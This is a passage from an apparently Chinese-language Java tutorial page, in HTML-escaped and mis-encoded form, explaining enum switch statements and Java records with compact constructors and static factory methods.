&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cannot process &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="record">record&lt;/h3>
&lt;p>java14å¼€å§‹&lt;/p>
&lt;ul>
&lt;li>ä¸å˜ç±»çš„classå’Œå­—æ®µéƒ½ä½¿ç”¨&lt;code>final&lt;/code>å…³é”®å­—ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±»ï¼Œåˆ›å»ºå®ä¾‹åæ— æ³•ä¿®æ”¹ä»»ä½•å­—æ®µ&lt;/li>
&lt;li>åˆ›å»ºä¸å˜ç±»åä¸ºäº†ä¿è¯ä¸å˜ç±»çš„æ¯”è¾ƒï¼Œè¿˜éœ€è¦æ­£ç¡®è¦†å†™&lt;code>equals()&lt;/code>å’Œ&lt;code>hashCode()&lt;/code>æ–¹æ³•ï¼Œæ‰‹åŠ¨è¦†å†™å¾ˆéº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥ç”¨recordä¸€è¡Œå†™å‡ºä¸å˜ç±»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åä¸€è¡Œç›¸å½“äº&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Point[x=%s, y=%s]&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é™¤äº†ç”¨&lt;code>final&lt;/code>ä¿®é¥°classä»¥åŠæ¯ä¸ªå­—æ®µå¤–ï¼Œç¼–è¯‘å™¨è¿˜è‡ªåŠ¨ä¸ºæˆ‘ä»¬åˆ›å»ºäº†æ„é€ æ–¹æ³•ï¼Œå’Œå­—æ®µååŒåçš„æ–¹æ³•ï¼Œä»¥åŠè¦†å†™&lt;code>toString()&lt;/code>ã€&lt;code>equals()&lt;/code>å’Œ&lt;code>hashCode()&lt;/code>æ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>å’Œ&lt;code>enum&lt;/code>ç±»ä¼¼ï¼Œæˆ‘ä»¬è‡ªå·±ä¸èƒ½ç›´æ¥ä»&lt;code>Record&lt;/code>æ´¾ç”Ÿï¼Œåªèƒ½é€šè¿‡&lt;code>record&lt;/code>å…³é”®å­—ç”±ç¼–è¯‘å™¨å®ç°ç»§æ‰¿&lt;/li>
&lt;li>å¦‚æœè¦å¯¹å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œå¯ä»¥ç”¨Compact Constructor&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘å™¨ç”Ÿæˆçš„æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿™æ˜¯æˆ‘ä»¬ç¼–å†™çš„Compact Constructor:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿™æ˜¯ç¼–è¯‘å™¨ç»§ç»­ç”Ÿæˆçš„èµ‹å€¼ä»£ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä½œä¸º&lt;code>record&lt;/code>çš„&lt;code>Point&lt;/code>ä»ç„¶å¯ä»¥é€šè¿‡&lt;code>of()&lt;/code>æ·»åŠ é™æ€æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†&lt;/h2>
&lt;h3 id="å¼‚å¸¸æ•è·å¼‚å¸¸">å¼‚å¸¸&amp;amp;æ•è·å¼‚å¸¸&lt;/h3>
&lt;ul>
